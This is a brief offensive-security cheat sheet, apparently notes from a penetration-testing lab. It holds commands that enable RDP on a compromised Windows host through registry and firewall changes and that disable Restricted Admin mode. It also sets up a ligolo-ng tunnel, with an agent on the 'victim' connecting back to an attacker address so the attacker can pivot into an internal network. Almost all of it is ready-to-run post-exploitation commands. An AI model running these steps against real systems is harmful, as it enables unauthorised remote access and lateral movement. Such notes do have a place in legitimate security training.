Enable RDP
```
shell reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

shell netsh advfirewall firewall set rule group="remote desktop" new enable=Yes




shell reg add "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

ligolo - https://github.com/nicocha30/ligolo-ng

```
Public network: 192.168.211.120
Internal Network: 172.16.211

compiling --- use the CGO_ENABLED=0 flag when building because of issues with glibc

On Kali
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up

sudo ./proxy -selfcert


sudo ip route add 192.168.211.0/24 dev ligolo


On victim : 
./agent -connect 192.168.45.195:11601 -ignore-cert




```